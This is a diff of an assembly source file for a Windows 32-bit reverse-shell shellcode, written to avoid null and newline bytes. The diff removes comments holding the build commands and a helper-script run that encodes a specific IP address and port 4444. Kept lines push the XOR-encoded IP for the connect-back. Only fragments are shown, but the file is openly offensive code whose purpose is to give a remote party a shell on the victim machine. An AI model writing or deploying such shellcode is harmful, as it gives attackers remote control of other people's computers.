@@ -1,10 +1,6 @@
 ; Windows x86 32 bits shellcode reverse shelll
 ; not contains: 0x00, 0x0A, 0x0D
 
-; rm -rf reverse_shell*
-; nasm.exe -f win32 reverse_asm.asm -o reverse_shell.o
-; ld -mi386pe reverse_shell.o -o reverse_shell32.exe
-
 ; MIT License - Copyright 2020
 ; David Reguera Garcia aka Dreg - dreg@fr33project.org
 ; -
@@ -223,17 +219,6 @@ call edi
 
 add esp, 4*2
 
-; dreg@fr33project:~# ./genipport.sh
-; ip: 51.195.45.136
-; port: 4444
-; converting IP....
-; converting: 33C32D88
-; endian: 882DC333
-; IP converted: 77D23CCC
-; converting PORT....
-; converting: 115C
-; endian: 5C11
-; port converted: A3EE
 xor ecx, ecx
 push dword 0x77D23CCC ; IP 
 xor dword [esp], 0xffffffff
